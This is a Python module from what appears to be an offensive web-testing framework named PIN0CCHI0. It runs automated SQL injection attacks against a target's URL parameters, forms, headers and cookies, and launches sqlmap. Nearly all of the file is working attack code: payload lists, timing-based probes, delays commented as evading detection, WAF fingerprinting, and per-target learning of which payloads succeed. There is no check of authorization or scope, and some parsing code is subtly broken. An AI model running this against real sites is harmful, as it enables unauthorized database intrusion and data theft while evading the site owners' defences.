#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SQL Injection Testing Module for PIN0CCHI0

This module performs specialized SQL injection testing using various techniques
to identify and exploit SQL injection vulnerabilities in web applications.
"""

import os
import json
import re
import random
import time
import logging
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

from core.base_module import VulnTestingModule
from core.utils import make_request, run_command, ensure_dir_exists
from core.payloads import generate_payloads, waf_fingerprint
from core.memory import AgentMemory

# Configure logger
logger = logging.getLogger('pin0cchi0.vuln_testing.sql_injection')

class SQLInjectionTester(VulnTestingModule):
    """SQL Injection Testing module for PIN0CCHI0."""
    
    def __init__(self):
        """Initialize the SQL Injection Testing module."""
        super().__init__()
        self.name = "SQL Injection Tester"
        self.description = "Tests for SQL injection vulnerabilities in web applications"
        self.category = "vuln_testing"
        self.author = "PIN0CCHI0 Team"
        self.version = "0.1.0"
        self.references = [
            "https://owasp.org/www-community/attacks/SQL_Injection",
            "https://portswigger.net/web-security/sql-injection",
            "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
        ]
        
        # Initialize results storage
        self.vulnerabilities = []
        self.tested_endpoints = set()
        self.confirmed_vulnerabilities = []
        # Persistent learning context
        try:
            self.ctx = AgentMemory()
        except Exception:
            self.ctx = None
        
        # SQL injection payloads
        self.error_based_payloads = [
            "'", 
            "\"'", 
            "\\'", 
            "1'", 
            "1\"'", 
            "1\\'",
            "' OR '1'='1", 
            "\" OR \"1\"=\"1", 
            "') OR ('1'='1", 
            "1' OR '1'='1' --", 
            "' OR 1=1 --", 
            "\" OR 1=1 --", 
            "' OR '1'='1' /*", 
            "\" OR \"1\"=\"1\" /*",
            "' UNION SELECT 1,2,3 --",
            "\" UNION SELECT 1,2,3 --",
            "') UNION SELECT 1,2,3 --",
            "1' UNION SELECT 1,2,3 --"
        ]
        
        self.blind_payloads = [
            "' AND SLEEP(5) --",
            "\" AND SLEEP(5) --",
            "' AND pg_sleep(5) --",
            "\" AND pg_sleep(5) --",
            "' AND WAITFOR DELAY '0:0:5' --",
            "\" AND WAITFOR DELAY '0:0:5' --",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
            "\" AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
            "' AND 1=(SELECT COUNT(*) FROM tabname); --",
            "\" AND 1=(SELECT COUNT(*) FROM tabname); --"
        ]
        
        self.time_based_payloads = [
            "' AND SLEEP(5) AND '1'='1",
            "\" AND SLEEP(5) AND \"1\"=\"1",
            "' OR SLEEP(5) AND '1'='1",
            "\" OR SLEEP(5) AND \"1\"=\"1",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1",
            "\" AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND \"1\"=\"1",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a) OR '1'='1",
            "\" OR (SELECT * FROM (SELECT(SLEEP(5)))a) OR \"1\"=\"1"
        ]
        
        # SQL error patterns
        self.sql_error_patterns = [
            r"SQL syntax.*?MySQL", 
            r"Warning.*?\Wmysqli?_", 
            r"MySQLSyntaxErrorException", 
            r"valid MySQL result", 
            r"check the manual that corresponds to your (MySQL|MariaDB) server version",
            r"ORA-[0-9][0-9][0-9][0-9]", 
            r"Oracle error", 
            r"Oracle.*?Driver", 
            r"Warning.*?\Woci_", 
            r"Warning.*?\Wora_",
            r"Microsoft SQL Server", 
            r"\[SQL Server\]", 
            r"\[ODBC SQL Server Driver\]", 
            r"\[SQLServer JDBC Driver\]", 
            r"Warning.*?\Wmssql_",
            r"\[Microsoft\]\[ODBC SQL Server Driver\]\[SQL Server\]", 
            r"ODBC SQL Server Driver", 
            r"ODBC Driver \d+ for SQL Server",
            r"SQLite/JDBCDriver", 
            r"SQLite\.Exception", 
            r"System\.Data\.SQLite\.SQLiteException", 
            r"Warning.*?\W(sqlite_|SQLite3::)",
            r"\[SQLITE_ERROR\]", 
            r"SQL error.*?\[\] near",
            r"PostgreSQL.*?ERROR", 
            r"Warning.*?\Wpg_", 
            r"valid PostgreSQL result", 
            r"Npgsql\.",
            r"PG::SyntaxError:", 
            r"org\.postgresql\.util\.PSQLException",
            r"ERROR:\s+syntax error at or near",
            r"ERROR: parser: parse error at or near",
            r"DB2 SQL error", 
            r"\[IBM\]\[CLI Driver\]\[DB2/",
            r"\[CLI Driver\]",
            r"\[DB2/",
            r"SQLSTATE=\d+",
            r"\[Microsoft\]\[ODBC Driver",
            r"Unclosed quotation mark after the character string",
            r"'80040e14'",
            r"Incorrect syntax near",
            r"Syntax error in string in query expression",
            r"ADODB\.Field \(0x800A0BCD\)",
            r"ADODB\.Recordset",
            r"Unclosed quotation mark before the character string",
            r"\[DM_QUERY_E_SYNTAX\]",
            r"javax\.servlet\.ServletException",
            r"java\.sql\.SQLException",
            r"Syntax error or access violation",
            r"Invalid SQL statement",
            r"unterminated quoted string"
        ]
        
    def run(self, target, config=None):
        """Run the SQL injection tester on the target.
        
        Args:
            target (str): The target URL to test
            config (dict): Configuration options for the test
            
        Returns:
            dict: Test results and identified vulnerabilities
        """
        logger.info(f"Starting SQL injection testing on {target}")
        
        if config is None:
            config = {}
        
        # Ensure target is properly formatted
        if not target.startswith(('http://', 'https://')):
            target = f"http://{target}"
        
        # Create results directory
        timestamp = int(time.time())
        results_dir = os.path.join(os.getcwd(), 'results', 'vuln_testing', f"sqli_test_{timestamp}")
        ensure_dir_exists(results_dir)
        
        # Get configuration options
        max_threads = config.get('sql_injection', {}).get('max_threads', 5)
        use_sqlmap = config.get('sql_injection', {}).get('use_sqlmap', True)
        test_forms = config.get('sql_injection', {}).get('test_forms', True)
        test_headers = config.get('sql_injection', {}).get('test_headers', False)
        test_cookies = config.get('sql_injection', {}).get('test_cookies', False)
        
        # Discover endpoints to test
        endpoints = self._discover_endpoints(target, test_forms)
        
        # Test discovered endpoints for SQL injection
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            # Test URL parameters
            for endpoint in endpoints:
                if endpoint['url'] not in self.tested_endpoints:
                    self.tested_endpoints.add(endpoint['url'])
                    executor.submit(self._test_endpoint, endpoint, target)
        
        # Run SQLMap if enabled
        if use_sqlmap:
            self._run_sqlmap(target, results_dir)
        
        # Test HTTP headers if enabled
        if test_headers:
            self._test_headers(target)
        
        # Test cookies if enabled
        if test_cookies:
            self._test_cookies(target)
        
        # Consolidate and deduplicate results
        self._consolidate_results()
        
        # Save results to file
        results_file = os.path.join(results_dir, 'sql_injection_results.json')
        with open(results_file, 'w') as f:
            json.dump({
                'target': target,
                'timestamp': timestamp,
                'vulnerabilities': self.vulnerabilities,
                'scan_summary': {
                    'total_vulnerabilities': len(self.vulnerabilities),
                    'total_endpoints_tested': len(self.tested_endpoints),
                    'confirmed_vulnerabilities': len(self.confirmed_vulnerabilities)
                }
            }, f, indent=2)
        
        logger.info(f"SQL injection testing completed. Found {len(self.vulnerabilities)} potential vulnerabilities.")
        logger.info(f"Results saved to {results_file}")
        
        return {
            'vulnerabilities': self.vulnerabilities,
            'results_file': results_file
        }
    
    def _discover_endpoints(self, target, test_forms=True):
        """Discover endpoints on the target for testing."""
        logger.info(f"Discovering endpoints on {target}")
        
        endpoints = []
        
        # Add the main target URL
        endpoints.append({'url': target, 'type': 'url'})
        
        # Get the main page
        response = make_request(target)
        
        if not response['success']:
            logger.warning(f"Failed to retrieve main page for endpoint discovery: {response.get('error', 'Unknown error')}")
            return endpoints
        
        html = response['text']
        
        # Find all links with query parameters
        link_pattern = re.compile(r'href=["\']([^"\'>]*\?[^"\'>]*)["\']', re.IGNORECASE)
        links = link_pattern.findall(html)
        
        for link in links:
            # Handle relative URLs
            if not link.startswith(('http://', 'https://', '//')): 
                link = urllib.parse.urljoin(target, link)
            elif link.startswith('//'):
                link = 'https:' + link if target.startswith('https') else 'http:' + link
            
            # Only include endpoints from the same domain
            if urllib.parse.urlparse(link).netloc == urllib.parse.urlparse(target).netloc:
                endpoints.append({'url': link, 'type': 'link'})
        
        # Find all forms if enabled
        if test_forms:
            form_pattern = re.compile(r'<form[^>]*action=["\']([^"\'>]*)["\'][^>]*>(.*?)</form>', re.DOTALL | re.IGNORECASE)
            form_matches = form_pattern.findall(html)
            
            for action, form_content in form_matches:
                # Handle empty action (submits to current page)
                if not action:
                    action = urllib.parse.urlparse(target).path or '/'
                
                # Handle relative URLs
                if not action.startswith(('http://', 'https://', '//')): 
                    action = urllib.parse.urljoin(target, action)
                elif action.startswith('//'):
                    action = 'https:' + action if target.startswith('https') else 'http:' + action
                
                # Only include endpoints from the same domain
                if urllib.parse.urlparse(action).netloc == urllib.parse.urlparse(target).netloc:
                    # Find input fields
                    input_pattern = re.compile(r'<input[^>]*name=["\']([^"\'>]+)["\'][^>]*>', re.IGNORECASE)
                    inputs = input_pattern.findall(form_content)
                    
                    # Add form endpoint with input fields
                    endpoints.append({
                        'url': action,
                        'type': 'form',
                        'method': self._get_form_method(form_content),
                        'inputs': inputs
                    })
        
        # Deduplicate endpoints
        unique_endpoints = []
        seen_urls = set()
        
        for endpoint in endpoints:
            url = endpoint['url']
            # Remove fragments
            url = url.split('#')[0]
            
            if url not in seen_urls:
                seen_urls.add(url)
                endpoint['url'] = url
                unique_endpoints.append(endpoint)
        
        logger.info(f"Discovered {len(unique_endpoints)} unique endpoints")
        return unique_endpoints
    
    def _get_form_method(self, form_content):
        """Extract the HTTP method from a form."""
        method_match = re.search(r'method=["\']([^"\'>]+)["\']', form_content, re.IGNORECASE)
        if method_match:
            return method_match.group(1).upper()
        return 'GET'  # Default to GET if method not specified
    
    def _test_endpoint(self, endpoint, target):
        """Test an endpoint for SQL injection vulnerabilities."""
        url = endpoint['url']
        logger.info(f"Testing endpoint for SQL injection: {url}")
        
        # Parse URL to get parameters
        parsed_url = urllib.parse.urlparse(url)
        path = parsed_url.path
        query = parsed_url.query
        
        # If URL has query parameters, test each parameter
        if query:
            params = query.split('&')
            for param in params:
                if '=' in param:
                    param_name = param.split('=')[0]
                    
                    # Test error-based SQL injection
                    self._test_error_based(url, param_name, parsed_url)
                    
                    # Test blind SQL injection
                    self._test_blind(url, param_name, parsed_url)
                    
                    # Test time-based SQL injection
                    self._test_time_based(url, param_name, parsed_url)
        
        # If endpoint is a form, test form inputs
        if endpoint['type'] == 'form' and 'inputs' in endpoint:
            for input_name in endpoint['inputs']:
                # For GET forms, parameters are in the URL
                if endpoint['method'] == 'GET':
                    # Test error-based SQL injection
                    self._test_error_based(url, input_name, parsed_url)
                    
                    # Test blind SQL injection
                    self._test_blind(url, input_name, parsed_url)
                    
                    # Test time-based SQL injection
                    self._test_time_based(url, input_name, parsed_url)
                
                # For POST forms, we need to send POST requests
                else:  # POST, PUT, etc.
                    # Test error-based SQL injection with POST
                    self._test_error_based_post(url, input_name)
                    
                    # Test blind SQL injection with POST
                    self._test_blind_post(url, input_name)
                    
                    # Test time-based SQL injection with POST
                    self._test_time_based_post(url, input_name)
    
    def _test_error_based(self, url, param_name, parsed_url):
        """Test for error-based SQL injection."""
        path = parsed_url.path
        query = parsed_url.query
        target_base = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        # Get a baseline response
        baseline_response = make_request(url)
        
        if not baseline_response['success']:
            return
        
        # Build adaptive payloads (fallback to static list)
        hints = {}
        payload_defs = generate_payloads('sqli', hints=hints, limit=20) or []
        if not payload_defs:
            payload_defs = [{'key': None, 'value': p} for p in self.error_based_payloads]
        
        # Test each payload
        for p in payload_defs:
            # Randomized jitter to evade detection (0.5s to 2.5s)
            time.sleep(random.uniform(0.5, 2.5))
            payload_key = p.get('key') if isinstance(p, dict) else None
            payload = p.get('value') if isinstance(p, dict) else str(p)
            # Replace parameter value with payload
            new_query = self._replace_param_value(query, param_name, payload)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{path}?{new_query}"
            
            # Send request with payload
            t0 = time.time()
            response = make_request(test_url)
            dt = time.time() - t0
            
            if not response['success']:
                # Learn failure outcome
                try:
                    if self.ctx:
                        self.ctx.learn_payload_outcome(target_base, 'sqli', payload_key or f"raw:{payload}", success=False, last_outcome='failure', latency_ms=dt*1000)
                except Exception:
                    pass
                continue
            
            # WAF fingerprint
            waf_sig = waf_fingerprint(response.get('status_code', 0), response.get('headers', {}), (response.get('text') or '')[:300])
            
            found = False
            # Check for SQL error patterns in the response
            for pattern in self.sql_error_patterns: # type: ignore
                if re.search(pattern, response.get('text', ''), re.IGNORECASE):
                    vuln = {
                        'name': "Error-based SQL Injection",
                        'severity': "high",
                        'description': "An error-based SQL injection vulnerability was found.",
                        'location': url,
                        'parameter': param_name,
                        'payload': payload,
                        'evidence': f"SQL error pattern matched: {pattern}",
                        'type': 'sqli_error',
                        'remediation': "Use parameterized queries or prepared statements"
                    }
                    self.vulnerabilities.append(vuln)
                    logger.info(f"Found error-based SQL injection vulnerability in parameter {param_name} on {url}")
                    found = True
                    break
            
            if not found:
                # Check for significant response differences
                try: # type: ignore
                    if len(response.get('text', '')) > len(baseline_response.get('text', '')) * 1.5 or len(response.get('text', '')) < len(baseline_response.get('text', '')) * 0.5:
                        vuln = {
                            'name': "Potential SQL Injection",
                            'severity': "medium",
                            'description': "A potential SQL injection vulnerability was found based on response size difference.",
                            'location': url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': f"Response size changed significantly with payload",
                            'type': 'sqli_potential',
                            'remediation': "Use parameterized queries or prepared statements"
                        }
                        self.vulnerabilities.append(vuln)
                        logger.info(f"Found potential SQL injection vulnerability in parameter {param_name} on {url}")
                        found = True
                except Exception:
                    pass
            
            # Learn outcome
            try:
                if self.ctx:
                    blocked = (response.get('status_code') in (403, 406)) or bool(waf_sig)
                    self.ctx.learn_payload_outcome(
                        target_base, 'sqli', payload_key or f"raw:{payload}",
                        success=found, waf_signature=waf_sig, latency_ms=dt*1000,
                        last_outcome='blocked' if blocked and not found else ('success' if found else 'failure')
                    )
            except Exception:
                pass
            
            if found:
                return  # Stop after first finding
    
    def _test_blind(self, url, param_name, parsed_url):
        """Test for blind SQL injection."""
        path = parsed_url.path
        query = parsed_url.query
        
        # Get a baseline response
        baseline_response = make_request(url)
        
        if not baseline_response['success']:
            return
        
        # Test true condition
        true_payload = "' AND 1=1 --"
        new_query = self._replace_param_value(query, param_name, true_payload)
        true_url = f"{parsed_url.scheme}://{parsed_url.netloc}{path}?{new_query}"
        
        true_response = make_request(true_url)
        
        if not true_response['success']:
            return
        
        # Test false condition
        false_payload = "' AND 1=2 --"
        new_query = self._replace_param_value(query, param_name, false_payload)
        false_url = f"{parsed_url.scheme}://{parsed_url.netloc}{path}?{new_query}"
        
        false_response = make_request(false_url)
        
        if not false_response['success']:
            return
        
        # Compare responses
        if (true_response.get('text', '') == baseline_response.get('text', '') and 
            false_response.get('text', '') != baseline_response.get('text', '')):
            vuln = {
                'name': "Blind SQL Injection",
                'severity': "high",
                'description': "A blind SQL injection vulnerability was found.",
                'location': url,
                'parameter': param_name,
                'payload': "' AND 1=1 -- / ' AND 1=2 --",
                'evidence': "Different responses for true and false conditions",
                'type': 'sqli_blind',
                'remediation': "Use parameterized queries or prepared statements"
            }
            self.vulnerabilities.append(vuln)
            logger.info(f"Found blind SQL injection vulnerability in parameter {param_name} on {url}")
    
    def _test_time_based(self, url, param_name, parsed_url):
        """Test for time-based SQL injection."""
        path = parsed_url.path
        query = parsed_url.query
        
        # Get baseline response time
        start_time = time.time()
        baseline_response = make_request(url)
        baseline_time = time.time() - start_time
        
        if not baseline_response['success']:
            return
        
        target_base = f"{parsed_url.scheme}://{parsed_url.netloc}"
        # Build time-based payloads (filter by tag)
        cand = generate_payloads('sqli', hints={'comment': '--'}, limit=30)
        time_payloads = [p for p in cand if isinstance(p, dict) and 'time' in (p.get('tags') or [])]
        if not time_payloads:
            time_payloads = [{'key': None, 'value': p, 'meta': {'delay_s': 5}} for p in self.time_based_payloads]
        
        # Test each time-based payload
        for p in time_payloads:
            # Randomized jitter to evade detection (0.5s to 2.5s)
            time.sleep(random.uniform(0.5, 2.5))
            payload_key = p.get('key')
            payload = p.get('value')
            delay = (p.get('meta') or {}).get('delay_s', 5)
            # Replace parameter value with payload
            new_query = self._replace_param_value(query, param_name, payload)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{path}?{new_query}"
            
            # Send request with payload and measure time
            start_time = time.time()
            response = make_request(test_url)
            response_time = time.time() - start_time
            
            if not response['success']:
                try:
                    if self.ctx:
                        self.ctx.learn_payload_outcome(target_base, 'sqli', payload_key or f"raw:{payload}", success=False, last_outcome='failure', latency_ms=response_time*1000)
                except Exception:
                    pass
                continue
            
            # WAF and timing
            waf_sig = waf_fingerprint(response.get('status_code', 0), response.get('headers', {}), (response.get('text') or '')[:300])
            threshold = max(4, delay - 1)  # conservative threshold
            
            if response_time > baseline_time + threshold:
                vuln = {
                    'name': "Time-based SQL Injection",
                    'severity': "high",
                    'description': "A time-based SQL injection vulnerability was found.",
                    'location': url,
                    'parameter': param_name,
                    'payload': payload,
                    'evidence': f"Response time increased from {baseline_time:.2f}s to {response_time:.2f}s",
                    'type': 'sqli_time',
                    'remediation': "Use parameterized queries or prepared statements"
                }
                self.vulnerabilities.append(vuln)
                logger.info(f"Found time-based SQL injection vulnerability in parameter {param_name} on {url}")
                try:
                    if self.ctx:
                        self.ctx.learn_payload_outcome(target_base, 'sqli', payload_key or f"raw:{payload}", success=True, waf_signature=waf_sig, latency_ms=response_time*1000, last_outcome='success')
                except Exception:
                    pass
                return  # Found a vulnerability, no need to test more payloads
            else:
                try:
                    if self.ctx:
                        blocked = (response.get('status_code') in (403, 406)) or bool(waf_sig)
                        self.ctx.learn_payload_outcome(target_base, 'sqli', payload_key or f"raw:{payload}", success=False, waf_signature=waf_sig, latency_ms=response_time*1000, last_outcome='blocked' if blocked else 'failure')
                except Exception:
                    pass
    
    def _test_error_based_post(self, url, param_name):
        """Test for error-based SQL injection using POST requests."""
        # Get a baseline response
        baseline_response = make_request(url, method='POST', data={param_name: 'test'})
        
        if not baseline_response['success']:
            return
        
        # Adaptive payloads
        payload_defs = generate_payloads('sqli', hints={}, limit=20) or []
        if not payload_defs:
            payload_defs = [{'key': None, 'value': p} for p in self.error_based_payloads]

        target_base = f"{urllib.parse.urlparse(url).scheme}://{urllib.parse.urlparse(url).netloc}"
        
        # Test each payload
        for p in payload_defs:
            # Randomized jitter to evade detection (0.5s to 2.5s)
            time.sleep(random.uniform(0.5, 2.5))
            payload_key = p.get('key') if isinstance(p, dict) else None
            payload = p.get('value') if isinstance(p, dict) else str(p)
            
            # Send request with payload
            t0 = time.time()
            response = make_request(url, method='POST', data={param_name: payload})
            dt = time.time() - t0
            
            if not response['success']:
                try:
                    if self.ctx:
                        self.ctx.learn_payload_outcome(target_base, 'sqli', payload_key or f"raw:{payload}", success=False, last_outcome='failure', latency_ms=dt*1000)
                except Exception:
                    pass
                continue
            
            waf_sig = waf_fingerprint(response.get('status_code', 0), response.get('headers', {}), (response.get('text') or '')[:300])
            found = False
            # Check for SQL error patterns in the response
            for pattern in self.sql_error_patterns:
                if re.search(pattern, response['text'], re.IGNORECASE):
                    vuln = {
                        'name': "Error-based SQL Injection (POST)",
                        'severity': "high",
                        'description': "An error-based SQL injection vulnerability was found in a POST parameter.",
                        'location': url,
                        'parameter': param_name,
                        'payload': payload,
                        'evidence': f"SQL error pattern matched: {pattern}",
                        'type': 'sqli_error_post',
                        'remediation': "Use parameterized queries or prepared statements"
                    }
                    self.vulnerabilities.append(vuln)
                    logger.info(f"Found error-based SQL injection vulnerability in POST parameter {param_name} on {url}")
                    found = True
                    break
            
            # Check for significant response differences
            if not found:
                try: # type: ignore
                    if len(response.get('text', '')) > len(baseline_response.get('text', '')) * 1.5 or len(response.get('text', '')) < len(baseline_response.get('text', '')) * 0.5:
                        vuln = {
                            'name': "Potential SQL Injection (POST)",
                            'severity': "medium",
                            'description': "A potential SQL injection vulnerability was found in a POST parameter based on response size difference.",
                            'location': url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': f"Response size changed significantly with payload",
                            'type': 'sqli_potential_post',
                            'remediation': "Use parameterized queries or prepared statements"
                        }
                        self.vulnerabilities.append(vuln)
                        logger.info(f"Found potential SQL injection vulnerability in POST parameter {param_name} on {url}")
                        found = True
                except Exception:
                    pass
            
            try:
                if self.ctx:
                    blocked = (response.get('status_code') in (403, 406)) or bool(waf_sig)
                    self.ctx.learn_payload_outcome(target_base, 'sqli', payload_key or f"raw:{payload}", success=found, waf_signature=waf_sig, latency_ms=dt*1000, last_outcome='blocked' if blocked and not found else ('success' if found else 'failure'))
            except Exception:
                pass
            
            if found:
                return  # stop after first finding
    
    def _test_blind_post(self, url, param_name):
        """Test for blind SQL injection using POST requests."""
        # Get a baseline response
        baseline_response = make_request(url, method='POST', data={param_name: 'test'})
        
        if not baseline_response['success']:
            return
        
        # Test true condition
        true_response = make_request(url, method='POST', data={param_name: "' AND 1=1 --"})
        
        if not true_response['success']:
            return
        
        # Test false condition
        false_response = make_request(url, method='POST', data={param_name: "' AND 1=2 --"})
        
        if not false_response['success']:
            return
        
        # Compare responses
        if (true_response.get('text', '') == baseline_response.get('text', '') and 
            false_response.get('text', '') != baseline_response.get('text', '')):
            vuln = {
                'name': "Blind SQL Injection (POST)",
                'severity': "high",
                'description': "A blind SQL injection vulnerability was found in a POST parameter.",
                'location': url,
                'parameter': param_name,
                'payload': "' AND 1=1 -- / ' AND 1=2 --",
                'evidence': "Different responses for true and false conditions",
                'type': 'sqli_blind_post',
                'remediation': "Use parameterized queries or prepared statements"
            }
            self.vulnerabilities.append(vuln)
            logger.info(f"Found blind SQL injection vulnerability in POST parameter {param_name} on {url}")
    
    def _test_time_based_post(self, url, param_name):
        """Test for time-based SQL injection using POST requests."""
        # Get baseline response time
        start_time = time.time()
        baseline_response = make_request(url, method='POST', data={param_name: 'test'})
        baseline_time = time.time() - start_time
        
        if not baseline_response['success']:
            return
        
        target_base = f"{urllib.parse.urlparse(url).scheme}://{urllib.parse.urlparse(url).netloc}"
        cand = generate_payloads('sqli', hints={'comment': '--'}, limit=30)
        time_payloads = [p for p in cand if isinstance(p, dict) and 'time' in (p.get('tags') or [])]
        if not time_payloads:
            time_payloads = [{'key': None, 'value': p, 'meta': {'delay_s': 5}} for p in self.time_based_payloads]
        
        # Test each time-based payload
        for p in time_payloads:
            # Randomized jitter to evade detection (0.5s to 2.5s)
            time.sleep(random.uniform(0.5, 2.5))
            payload_key = p.get('key')
            payload = p.get('value')
            delay = (p.get('meta') or {}).get('delay_s', 5)
            # Send request with payload and measure time
            start_time = time.time()
            response = make_request(url, method='POST', data={param_name: payload})
            response_time = time.time() - start_time
            
            if not response['success']:
                try:
                    if self.ctx:
                        self.ctx.learn_payload_outcome(target_base, 'sqli', payload_key or f"raw:{payload}", success=False, last_outcome='failure', latency_ms=response_time*1000)
                except Exception:
                    pass
                continue
            
            waf_sig = waf_fingerprint(response.get('status_code', 0), response.get('headers', {}), (response.get('text') or '')[:300])
            threshold = max(4, delay - 1)
            
            if response_time > baseline_time + threshold:
                vuln = {
                    'name': "Time-based SQL Injection (POST)",
                    'severity': "high",
                    'description': "A time-based SQL injection vulnerability was found in a POST parameter.",
                    'location': url,
                    'parameter': param_name,
                    'payload': payload,
                    'evidence': f"Response time increased from {baseline_time:.2f}s to {response_time:.2f}s",
                    'type': 'sqli_time_post',
                    'remediation': "Use parameterized queries or prepared statements"
                }
                self.vulnerabilities.append(vuln)
                logger.info(f"Found time-based SQL injection vulnerability in POST parameter {param_name} on {url}")
                try:
                    if self.ctx:
                        self.ctx.learn_payload_outcome(target_base, 'sqli', payload_key or f"raw:{payload}", success=True, waf_signature=waf_sig, latency_ms=response_time*1000, last_outcome='success')
                except Exception:
                    pass
                return  # Found a vulnerability, no need to test more payloads
            else:
                try:
                    if self.ctx:
                        blocked = (response.get('status_code') in (403, 406)) or bool(waf_sig)
                        self.ctx.learn_payload_outcome(target_base, 'sqli', payload_key or f"raw:{payload}", success=False, waf_signature=waf_sig, latency_ms=response_time*1000, last_outcome='blocked' if blocked else 'failure')
                except Exception:
                    pass
    
    def _test_headers(self, target):
        """Test HTTP headers for SQL injection vulnerabilities."""
        logger.info(f"Testing HTTP headers for SQL injection on {target}")
        
        # Headers to test
        headers_to_test = ['User-Agent', 'Referer', 'X-Forwarded-For']
        
        # Get baseline response
        baseline_response = make_request(target)
        
        if not baseline_response['success']:
            return
        
        # Test each header with error-based payloads
        for header in headers_to_test:
            for payload in self.error_based_payloads[:5]:  # Use a subset of payloads for headers
                custom_headers = {header: payload}
                response = make_request(target, headers=custom_headers)
                
                if not response['success']:
                    continue
                
                # Check for SQL error patterns in the response
                for pattern in self.sql_error_patterns:
                    if re.search(pattern, response.get('text', ''), re.IGNORECASE):
                        vuln = {
                            'name': f"SQL Injection in {header} header",
                            'severity': "high",
                            'description': f"A SQL injection vulnerability was found in the {header} HTTP header.",
                            'location': target,
                            'parameter': header,
                            'payload': payload,
                            'evidence': f"SQL error pattern matched: {pattern}",
                            'type': 'sqli_header',
                            'remediation': "Validate and sanitize all HTTP headers before using them in database queries"
                        }
                        self.vulnerabilities.append(vuln)
                        logger.info(f"Found SQL injection vulnerability in {header} header on {target}")
                        break
    
    def _test_cookies(self, target):
        """Test cookies for SQL injection vulnerabilities."""
        logger.info(f"Testing cookies for SQL injection on {target}")
        
        # Get baseline response and extract cookies
        baseline_response = make_request(target)
        
        if not baseline_response['success']:
            return
        
        # Extract cookies from response
        cookies = {} # type: ignore
        if 'set-Cookie' in baseline_response.get('headers', {}):
            cookie_header = baseline_response['headers']['set-cookie']
            cookie_parts = cookie_header.split(';')
            for part in cookie_parts:
                if '=' in part:
                    name, value = part.split('=', 1)
                    cookies[name.strip()] = value.strip()
        
        if not cookies:
            return
        
        # Test each cookie with error-based payloads
        for cookie_name, cookie_value in cookies.items():
            for payload in self.error_based_payloads[:5]:  # Use a subset of payloads for cookies
                # Modify the cookie value
                test_cookies = cookies.copy()
                test_cookies[cookie_name] = payload
                
                # Send request with modified cookie
                response = make_request(target, cookies=test_cookies)
                
                if not response['success']:
                    continue
                
                # Check for SQL error patterns in the response
                for pattern in self.sql_error_patterns:
                    if re.search(pattern, response.get('text', ''), re.IGNORECASE):
                        vuln = {
                            'name': f"SQL Injection in {cookie_name} cookie",
                            'severity': "high",
                            'description': f"A SQL injection vulnerability was found in the {cookie_name} cookie.",
                            'location': target,
                            'parameter': cookie_name,
                            'payload': payload,
                            'evidence': f"SQL error pattern matched: {pattern}",
                            'type': 'sqli_cookie',
                            'remediation': "Validate and sanitize all cookie values before using them in database queries"
                        }
                        self.vulnerabilities.append(vuln)
                        logger.info(f"Found SQL injection vulnerability in {cookie_name} cookie on {target}")
                        break
    
    def _run_sqlmap(self, target, results_dir):
        """Run SQLMap for automated SQL injection testing."""
        logger.info(f"Running SQLMap on {target}")
        
        # Prepare output file
        output_file = os.path.join(results_dir, 'sqlmap_results.json')
        
        # Run SQLMap command
        cmd = f"sqlmap -u {target} --batch --forms --crawl=3 --level=2 --risk=2 -o --output-dir={results_dir} --dump-format=JSON"
        result = run_command(cmd)
        
        if result['success']:
            logger.info(f"SQLMap scan completed successfully. Results saved to {results_dir}")
            
            # Parse SQLMap results (simplified, would need to be adjusted for actual output format)
            try:
                # SQLMap creates multiple files, we would need to find and parse them
                sqlmap_files = [f for f in os.listdir(results_dir) if f.startswith('sqlmap')]
                
                for sqlmap_file in sqlmap_files:
                    file_path = os.path.join(results_dir, sqlmap_file)
                    
                    if os.path.isfile(file_path) and file_path.endswith('.json'):
                        with open(file_path, 'r') as f:
                            sqlmap_results = json.load(f)
                        
                        # Process SQLMap findings
                        if 'data' in sqlmap_results:
                            for url, data in sqlmap_results['data'].items():
                                if 'injectable' in data and data['injectable']:
                                    # Add to vulnerabilities list
                                    vuln = {
                                        'name': "SQL Injection (SQLMap)",
                                        'severity': "high",
                                        'description': "SQLMap found a SQL injection vulnerability.",
                                        'location': url,
                                        'parameter': data.get('parameter', ''),
                                        'payload': data.get('payload', ''),
                                        'evidence': f"SQLMap found injectable parameter: {data.get('parameter', '')}",
                                        'type': 'sqli_sqlmap',
                                        'remediation': "Use parameterized queries or prepared statements"
                                    }
                                    self.vulnerabilities.append(vuln)
                                    self.confirmed_vulnerabilities.append(vuln)
                                    logger.info(f"SQLMap found SQL injection vulnerability in parameter {data.get('parameter', '')} on {url}")
                
            except Exception as e:
                logger.error(f"Failed to parse SQLMap results: {e}")
        else:
            logger.error(f"SQLMap scan failed: {result.get('error', 'Unknown error')}")
    
    def _replace_param_value(self, query, param_name, new_value):
        """Replace a parameter value in a query string."""
        params = query.split('&')
        new_params = []
        
        for param in params:
            if '=' in param:
                name, value = param.split('=', 1)
                if name == param_name:
                    new_params.append(f"{name}={urllib.parse.quote_plus(new_value)}")
                else:
                    new_params.append(param)
            else:
                new_params.append(param)
        
        return '&'.join(new_params)
    
    def _consolidate_results(self):
        """Consolidate and deduplicate vulnerability findings."""
        logger.info("Consolidating SQL injection findings")
        
        # Deduplicate vulnerabilities
        unique_vulns = []
        seen_vulns = set()
        
        for vuln in self.vulnerabilities:
            # Create a key for deduplication
            key = f"{vuln['name']}|{vuln['location']}|{vuln.get('parameter', '')}"
            
            if key not in seen_vulns:
                seen_vulns.add(key)
                unique_vulns.append(vuln)
        
        # Update vulnerabilities list
        self.vulnerabilities = unique_vulns
        
        # Sort by severity
        severity_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'info': 4}
        self.vulnerabilities.sort(key=lambda x: severity_order.get(x['severity'], 5))
        
        logger.info(f"Consolidated to {len(self.vulnerabilities)} unique vulnerabilities")